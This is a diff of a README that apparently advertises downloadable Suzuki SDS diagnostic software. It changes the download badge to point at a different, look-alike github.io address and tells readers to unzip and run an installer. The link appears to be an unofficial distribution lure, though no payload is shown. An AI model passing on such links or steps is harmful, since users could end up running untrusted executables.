@@ -8,7 +8,7 @@ It supports a wide range of Suzuki models, ensuring reliable diagnostics and eff
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://suzuki-sds-download.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://suzuki-sds-download-git.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer and follow the on-screen instructions.  
